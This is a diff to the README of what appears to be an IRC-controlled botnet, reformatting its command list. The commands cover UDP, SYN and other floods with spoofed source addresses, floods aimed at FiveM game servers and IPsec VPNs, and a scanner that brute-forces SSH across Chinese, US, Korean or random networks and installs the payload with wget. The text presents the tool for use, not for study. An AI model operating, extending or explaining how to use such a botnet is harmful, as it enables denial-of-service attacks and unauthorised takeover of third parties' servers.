@@ -80,7 +80,7 @@ All of the attack vectors will be <strong>random source port automatically, min 
 
 # IRC Commands
 	
-	DDoS vectors:
+	ATTACK VECTORS:
 	
 		?udp 	 <srcIP> <dstIP> <port> <size>			Just a normal UDP Flood attack.
 		?syn 	 <srcIP> <dstIP> <port> <size>			Just a normal SYN Flood attack.	
@@ -93,14 +93,14 @@ All of the attack vectors will be <strong>random source port automatically, min 
 		?fms 	 <srcIP> <dstIP>				Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
 		?ipsec 	 <srcIP> <dstIP>				Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
 	
-	?scan 	 <modes> <ftp>				Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
+	SCANNER:
 	
-	Scanner modes:
+		?scan 	 <modes> <server>                       	Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
 	
-		-cn		Scan on china network.
-		-usa		Scan on the united state of america network.
-		-kr		Scan on south korea network.
-		-r		Scan with random ip.	
+			-cn		Scan on china network.
+			-usa		Scan on the united state of america network.
+			-kr		Scan on south korea network.
+			-r		Scan with random ip.	
 		
 	?info				Get bot system information, for bot analysis.
 	?kill				Bot self-close.
